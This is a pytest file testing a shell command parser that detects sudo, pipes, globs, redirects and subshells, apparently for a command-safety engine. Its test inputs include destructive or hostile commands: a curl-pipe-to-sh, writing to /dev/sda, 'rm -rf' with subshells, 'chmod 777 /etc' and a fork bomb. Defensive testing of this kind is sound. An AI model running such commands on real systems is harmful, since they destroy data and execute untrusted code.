"""
Unit tests for the Command Parser — Owner: Harshit
Tests cover: tokenization, pipe splitting, sudo detection, glob detection,
redirect detection, subshell detection, edge cases.
"""

import pytest
from engine.parser.command_parser import CommandParser, ParsedCommand


@pytest.fixture
def parser():
    return CommandParser()


class TestBasicParsing:
    def test_simple_command(self, parser):
        p = parser.parse("ls -la /home", cwd="/", user="user")
        assert p.base_command == "ls"
        assert "-la" in p.flags
        assert "/home" in p.arguments

    def test_empty_command(self, parser):
        p = parser.parse("", cwd="/", user="user")
        assert p.base_command == ""
        assert p.tokens == []

    def test_command_with_quotes(self, parser):
        p = parser.parse('echo "hello world"', cwd="/", user="user")
        assert p.base_command == "echo"
        assert "hello world" in p.arguments


class TestSudoDetection:
    def test_sudo_basic(self, parser):
        p = parser.parse("sudo rm -rf /tmp/test", cwd="/", user="user")
        assert p.is_sudo is True
        assert p.base_command == "rm"

    def test_sudo_with_user_flag(self, parser):
        p = parser.parse("sudo -u root chmod 777 /etc", cwd="/", user="user")
        assert p.is_sudo is True
        assert p.base_command == "chmod"

    def test_no_sudo(self, parser):
        p = parser.parse("rm -rf /tmp/test", cwd="/", user="user")
        assert p.is_sudo is False


class TestPipeParsing:
    def test_simple_pipe(self, parser):
        p = parser.parse("curl http://x.sh | sh", cwd="/", user="user")
        assert p.has_pipe is True
        assert len(p.pipe_segments) == 2
        assert p.pipe_segments[0].base_command == "curl"
        assert p.pipe_segments[1].base_command == "sh"

    def test_no_pipe_on_logical_or(self, parser):
        p = parser.parse("ls /foo || echo 'not found'", cwd="/", user="user")
        assert p.has_pipe is False

    def test_multi_segment_pipe(self, parser):
        p = parser.parse("cat /etc/passwd | grep root | cut -d: -f1", cwd="/", user="user")
        assert len(p.pipe_segments) == 3


class TestGlobDetection:
    def test_glob_star(self, parser):
        p = parser.parse("rm -rf /var/log/*", cwd="/", user="user")
        assert p.is_glob is True
        assert "/var/log/*" in p.glob_patterns

    def test_no_glob(self, parser):
        p = parser.parse("rm -rf /var/log/syslog", cwd="/", user="user")
        assert p.is_glob is False


class TestRedirectDetection:
    def test_output_redirect(self, parser):
        p = parser.parse("echo '' > /dev/sda", cwd="/", user="user")
        assert p.has_redirect is True

    def test_append_redirect(self, parser):
        p = parser.parse("echo 'line' >> /etc/hosts", cwd="/", user="user")
        assert p.has_redirect is True


class TestSubshellDetection:
    def test_subshell_dollar(self, parser):
        p = parser.parse("rm -rf $(cat /tmp/targets.txt)", cwd="/", user="user")
        assert p.has_subshell is True

    def test_backtick_subshell(self, parser):
        p = parser.parse("chmod 777 `cat paths.txt`", cwd="/", user="user")
        assert p.has_subshell is True


class TestEdgeCases:
    def test_fork_bomb_tokenization(self, parser):
        """Fork bomb should not crash the parser."""
        cmd = ":(){ :|:& };:"
        p = parser.parse(cmd, cwd="/", user="user")
        assert p.raw == cmd  # Should survive tokenization

    def test_very_long_command(self, parser):
        cmd = "echo " + "a" * 10000
        p = parser.parse(cmd, cwd="/", user="user")
        assert p.base_command == "echo"
